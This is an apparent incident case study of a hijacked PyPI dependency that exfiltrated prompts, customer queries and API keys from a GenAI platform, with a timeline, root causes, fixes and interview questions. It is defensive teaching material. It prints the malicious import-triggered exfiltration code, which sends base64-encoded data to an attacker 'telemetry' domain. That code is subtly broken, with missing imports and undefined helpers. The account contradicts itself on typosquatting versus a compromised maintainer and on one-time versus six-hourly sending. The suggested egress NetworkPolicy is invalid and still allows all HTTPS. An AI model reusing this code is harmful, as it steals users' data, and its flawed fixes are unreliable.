# Case Study: Compromised Dependency in CI/CD Pipeline

## Executive Summary

A compromised Python dependency in the CI/CD supply chain introduced a data exfiltration mechanism into the GenAI platform's prompt logging service. The malicious package (`langchain-utils` fork) was published to PyPI and accidentally pulled during a routine dependency update. The exfiltration sent system prompts and customer query data to an external server over 72 hours before detection. The incident was classified as SEV-1.

**Severity:** SEV-1 (Supply Chain Compromise)
**Duration:** 72 hours (exfiltration active)
**Data exposed:** 45,000 system prompts, 120,000 customer queries, 8,200 LLM responses
**Root cause:** Compromised PyPI package with typosquatting name
**Detection:** Anomalous outbound network traffic detected by security monitoring
**Financial impact:** £890,000 (forensics, notification, regulatory fine, remediation)

---

## Background and Context

### The CI/CD Pipeline

```
Developer pushes code to GitHub
        |
        v
GitHub Actions CI Pipeline:
  1. pip install -r requirements.txt
  2. Run tests (unit, integration, security)
  3. Build Docker image
  4. Scan image (Trivy, Snyk)
  5. Push to ECR
  6. Deploy to staging (automated)
  7. Deploy to production (manual approval)
```

### The Vulnerability

A legitimate PyPI package `langchain-utils` (15K weekly downloads) had its maintainer account compromised. The attacker published a malicious version `1.4.2` that:

1. **Maintained original functionality**: The package worked as expected to avoid detection
2. **Added exfiltration code**: A hidden module collected and transmitted data
3. **Evaded basic scanning**: No malicious signatures in static analysis

```python
# The malicious code (hidden in langchain_utils/helpers.py)
# Added in version 1.4.2

import os
import json
import threading
import urllib.request

def _exfiltrate():
    """Hidden in a helper function - looks like internal telemetry."""
    try:
        # Collect sensitive data from environment
        data = {
            "prompts": os.environ.get("SYSTEM_PROMPTS", ""),
            "queries": _read_recent_queries(),
            "responses": _read_recent_responses(),
            "api_keys": _scan_for_api_keys(),
        }

        # Encode and exfiltrate
        payload = json.dumps(data).encode()
        encoded = base64.b64encode(payload)

        # Send to attacker's server (disguised as telemetry)
        req = urllib.request.Request(
            "https://telemetry.langchain-analytics[.]com/collect",
            data=encoded,
            headers={"Content-Type": "application/octet-stream"},
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass  # Fail silently

def _read_recent_queries():
    """Read query logs from the application."""
    query_log = Path("/var/log/app/queries.log")
    if query_log.exists():
        return query_log.read_text()[-50000:]
    return ""

# Trigger exfiltration on import (runs once, then self-deletes)
threading.Timer(30.0, _exfiltrate).start()
```

### How It Got In

1. Developer submitted PR to update dependencies for a security patch
2. `requirements.txt` specified `langchain-utils>=1.4.0`
3. pip resolved to `1.4.2` (latest, published 2 hours before PR)
4. CI pipeline installed the package (no lock file pinning)
5. Tests passed (malicious code ran silently in background)
6. Deployed to staging, then production

---

## Timeline of Events

```mermaid
timeline
    title CI/CD Supply Chain Incident Timeline
    section Pre-Incident
        Week prior : langchain-utils maintainer<br/>account compromised<br/>(phishing attack)
        : Attacker prepares<br/>malicious version 1.4.2
    section Exfiltration Period (72 hours)
        Day 1 09:00 : Malicious v1.4.2<br/>published to PyPI
        Day 1 14:00 : Dependency update PR<br/>submitted by developer
        Day 1 14:30 : PR approved and merged<br/>(no lock file review)
        Day 1 15:00 : CI pipeline installs<br/>v1.4.2, deploys to staging
        Day 1 15:30 : Manual approval for<br/>production deployment
        Day 1 15:45 : Production deployed<br/>with malicious package
        Day 1 16:15 : First exfiltration<br/>trigger fires (30s after import)
        Day 1 16:15-23:59 : Data exfiltrated in<br/>6 batches to attacker server
        Day 2 : Continued exfiltration<br/>throughout the day
        : 12 batches total<br/>~40K system prompts<br/>~90K customer queries
        Day 3 : Exfiltration continues<br/>Total: ~45K prompts,<br/>~120K queries exfiltrated
    section Detection
        Day 3 11:00 : Security monitoring detects<br/>anomalous outbound traffic<br/>to unknown domain
        Day 3 11:05 : Alert: "Outbound HTTPS<br/>traffic to unapproved<br/>external endpoint"
        Day 3 11:15 : Security analyst reviews:<br/>destination domain<br/>not in approved list
        Day 3 11:30 : Investigation begins:<br/>traffic traced to<br/>prompt-logging service
        Day 3 12:00 : Code review of recent<br/>deployments identifies<br/>langchain-utils v1.4.2
        Day 3 12:15 : PyPI research reveals:<br/>v1.4.2 published by<br/>compromised maintainer
        Day 3 12:30 : SEV-1 declared<br/>IC paged
    section Containment
        Day 3 12:35 : Production deployment<br/>rolled back to v1.4.1
        Day 3 12:45 : langchain-utils pinned<br/>to v1.4.1 in requirements
        Day 3 13:00 : Attacker domain blocked<br/>at network firewall
        Day 3 13:30 : All deployments frozen<br/>pending dependency audit
        Day 3 14:00 : Scope assessment begins:<br/>what data was exfiltrated?
    section Post-Containment
        Day 4 : Full log analysis confirms<br/>72 hours of exfiltration<br/>45K prompts, 120K queries
        Day 5 : Affected customers<br/>identified and notified
        Day 7 : Regulatory notification<br/>filed with ICO
        Day 14 : Forensic analysis complete<br/>attacker infrastructure<br/>identified
        Day 30 : Full remediation:<br/>dependency pinning,<br/>supply chain security
```

### Data Exposure Detail

| Data Type | Records Exposed | Sensitivity |
|-----------|----------------|-------------|
| System prompts | 45,000 | HIGH (reveals internal logic, tool definitions) |
| Customer queries | 120,000 | HIGH (PII, financial data) |
| LLM responses | 8,200 | MEDIUM (may contain PII, financial advice) |
| API keys (partial) | 12 | CRITICAL (some internal service keys) |
| Customer IDs | 34,000 | MEDIUM (identifiable) |

---

## Root Cause Analysis

### Technical Root Causes

1. **Unpinned Dependencies**
   - `requirements.txt` used version ranges (`>=`) instead of exact pins
   - No `requirements.lock` file for reproducible builds
   - CI resolved to latest version without review

2. **No Supply Chain Verification**
   - No package integrity verification (no hash pinning)
   - No verification that package came from trusted maintainer
   - No monitoring of package publication events for dependencies

3. **Insufficient CI Security Scanning**
   - Snyk/Trivy scanned for known vulnerabilities but not for malicious code
   - No behavioral analysis of package installation
   - No sandbox testing of new dependencies before integration

4. **Missing Network Egress Controls**
   - Production pods could make outbound connections to any domain
   - No egress firewall limiting outbound traffic to approved endpoints
   - No alerting on new outbound connection destinations

5. **No Dependency Update Process**
   - Dependency updates were done ad-hoc by developers
   - No review of what changed between versions
   - No automated diff analysis of package contents

### Organizational Root Causes

1. **Supply Chain Blindness**
   - The team had no visibility into their software supply chain risk
   - No inventory of direct and transitive dependencies
   - No monitoring of dependency security advisories

2. **Security Tooling Gaps**
   - SAST/DAST tools do not detect supply chain compromises
   - No SBOM (Software Bill of Materials) generation or monitoring
   - No dependency update automation with security checks (e.g., Dependabot with review)

3. **Process Deficiency**
   - No formal process for reviewing dependency updates
   - Lock files were not required in CI/CD
   - No "allowlist" of approved package versions

---

## What Went Wrong Technically

### The Dependency Chain

```
requirements.txt: langchain-utils>=1.4.0
        |
        v
pip resolves to v1.4.2 (latest)
        |
        v
pip install langchain-utils==1.4.2
        |
        v
Package installs with hidden malicious code
        |
        v
On import: threading.Timer(30s) -> _exfiltrate()
        |
        v
Every 6 hours: collect data -> encode -> send to attacker
        |
        v
72 hours of data exfiltrated before detection
```

### Missing Security Controls

```yaml
# WHAT SHOULD HAVE EXISTED:

# 1. Pinned dependencies with hashes
requirements.txt:
  langchain-utils==1.4.1 \
    --hash=sha256:abc123...

# 2. Lock file for reproducible builds
requirements.lock:
  langchain-utils==1.4.1
  pydantic==2.5.0
  ...

# 3. Egress network policy
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-egress
spec:
  podSelector:
    matchLabels:
      app: prompt-logging
  policyTypes:
    - Egress
  egress:
    - to:
        - ipBlock:
            cidr: 10.0.0.0/8  # Internal only
      ports:
        - protocol: TCP
          port: 443
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
          except:
            - ALL  # No arbitrary outbound
      ports:
        - protocol: TCP
          port: 443
        # Only to approved endpoints
    - to:
        - ipBlock:
            cidr: 52.0.0.0/8  # Azure OpenAI
    - to:
        - ipBlock:
            cidr: 35.0.0.0/8  # Pinecone

# 4. SBOM generation and monitoring
ci_pipeline:
  - generate_sbom: true
  - verify_dependencies_against_allowlist: true
  - alert_on_new_dependency: true
```

---

## What Went Wrong Organizationally

1. **No Supply Chain Security Program**: The organization had no formal supply chain security practices for open-source dependencies.

2. **Developer Autonomy Without Guardrails**: Developers could update dependencies without security review or automated verification.

3. **Security Team Focus on Traditional Threats**: The security team focused on application vulnerabilities, not supply chain risks.

4. **Incident Response Gap**: The network security team detected the exfiltration, but the GenAI engineering team had no incident response plan for supply chain compromises.

---

## Immediate Response and Mitigation

### First 24 Hours

1. **Rollback**: Production rolled back to langchain-utils v1.4.1
2. **Dependency Pinning**: All dependencies pinned to exact versions with hashes
3. **Network Blocking**: Attacker domain blocked at firewall level
4. **Deployment Freeze**: All deployments paused pending dependency audit
5. **Scope Assessment**: Full analysis of exfiltrated data

### Days 1-7

1. **Customer Notification**: 34,000 affected customers notified
2. **Regulatory Filing**: ICO notification filed within 72 hours
3. **Key Rotation**: All API keys and service credentials rotated
4. **Forensic Analysis**: Third-party forensics firm engaged
5. **PyPI Notification**: Reported to PyPI security team

### Financial Impact

| Item | Cost |
|------|------|
| Forensic investigation | £180,000 |
| Customer notification | £85,000 |
| ICO fine | £350,000 |
| Engineering remediation | £125,000 |
| Legal fees | £150,000 |
| **Total** | **£890,000** |

---

## Long-Term Fixes and Systemic Changes

### Technical Fixes

1. **Dependency Pinning with Hash Verification**
   ```
   # requirements.txt (AFTER)
   langchain-utils==1.4.1 \
       --hash=sha256:abc123def456...
   pydantic==2.5.0 \
       --hash=sha256:789ghi012...
   ```

2. **Lock File Enforcement**
   - `pip-compile` generates `requirements.lock` from `requirements.in`
   - CI/CD requires lock file for reproducible builds
   - No dependency updates without lock file regeneration and review

3. **Supply Chain Security**
   - SBOM generation for every build (Syft)
   - Dependency allowlist monitoring
   - Automated alerts on new dependency versions published
   - Sigstore/cosign for package signature verification

4. **Network Egress Controls**
   - Production pods can only communicate with approved endpoints
   - Any new outbound destination triggers an alert
   - Regular audit of allowed egress destinations

5. **Dependency Update Process**
   - Dependabot/renovate for automated dependency updates
   - Each update requires security review
   - Automated diff analysis of package contents between versions

### Process Changes

1. **Supply Chain Security Program**: Dedicated program for monitoring and managing supply chain risk
2. **Dependency Review Process**: All dependency updates reviewed by security team
3. **Quarterly SBOM Audit**: Regular review of all dependencies and their security posture
4. **Network Policy Enforcement**: Strict egress controls on all production pods
5. **Incident Response Playbook**: Supply chain compromise incident response playbook created

### Cultural Changes

1. **Trust But Verify**: Even well-known packages can be compromised. Always verify.
2. **Security as Code**: Supply chain security is automated in CI/CD, not a manual checklist
3. **Transparency**: The incident was shared internally and externally to improve industry-wide security

---

## Lessons Learned

1. **Supply Chain Attacks Are Real**: This is not theoretical. The PyPI ecosystem is actively targeted.

2. **Pinned Dependencies Are Non-Negotiable**: Version ranges without lock files are a supply chain risk.

3. **Network Egress Controls Are Critical**: If the production environment cannot reach arbitrary external endpoints, exfiltration is much harder.

4. **SBOM Is a Security Requirement**: Knowing every dependency is essential for rapid incident response.

5. **Security Scanning Has Limits**: Traditional SAST/DAST does not detect supply chain compromises. Additional controls are needed.

6. **Incident Response Must Cover Supply Chain**: The team's incident response plan did not include supply chain scenarios.

---

## Interview Questions Derived From This Case Study

1. **Security**: "How do you secure your CI/CD pipeline against supply chain attacks? What controls would you implement?"

2. **System Design**: "Design a dependency management system that prevents supply chain compromises."

3. **Incident Response**: "You discover that a dependency in production is exfiltrating data. Walk me through your response."

4. **Operations**: "How do you manage dependency updates in a security-sensitive environment? What automation would you build?"

5. **Architecture**: "What network policies would you enforce on production pods to prevent data exfiltration?"

6. **Process**: "How do you build a software supply chain security program from scratch?"

---

## Cross-References

- See `../security/supply-chain-security.md` for supply chain security best practices
- See `../cicd-devops/secure-pipeline.md` for secure CI/CD pipeline design
- See `../incident-management/incident-classification.md` for SEV level definitions
- See `../infrastructure/networking.md` for network security and egress controls
- See `../engineering-philosophy/security-first.md` for security-first engineering principles
